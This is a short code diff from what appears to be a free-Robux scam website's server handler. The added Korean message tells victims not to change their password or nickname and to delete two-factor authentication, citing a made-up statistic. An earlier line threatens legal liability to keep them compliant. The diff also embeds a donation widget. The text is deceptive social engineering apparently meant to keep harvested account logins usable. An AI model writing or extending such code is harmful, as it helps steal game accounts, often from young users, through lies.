@@ -108,7 +108,11 @@ ${advertise_checked}
                 if (error) {
                     return res.send("ERROR PLEASE TRY AGAIN");
                 } else {
-                    return res.send("빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 그렇지 않으면 우리 API에 문제가 생겨 전송에 실패하게 되고 당신은 트래픽 과다 이용으로 법적 책임을 물 수 있습니다.");
+                    return res.send(`<h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 2단계 인증을 삭제하십시오. 일반적으로 2단계 인증을 사용한 사용자가 그렇지 않은 사용자보다 평균 1271.2% 더 많이 기다렸습니다.</h2>
+<h1>기부로 개발자를 도와주세요!</h1>
+<iframe src="https://nowpayments.io/embeds/donation-widget?api_key=SPB4XA6-B4M4TZ4-HTHXA2C-96QC978" width="346" height="623" frameborder="0" scrolling="no" style="overflow-y: hidden;">
+    Can't load widget
+</iframe>`);
                 }
             });
         } else {
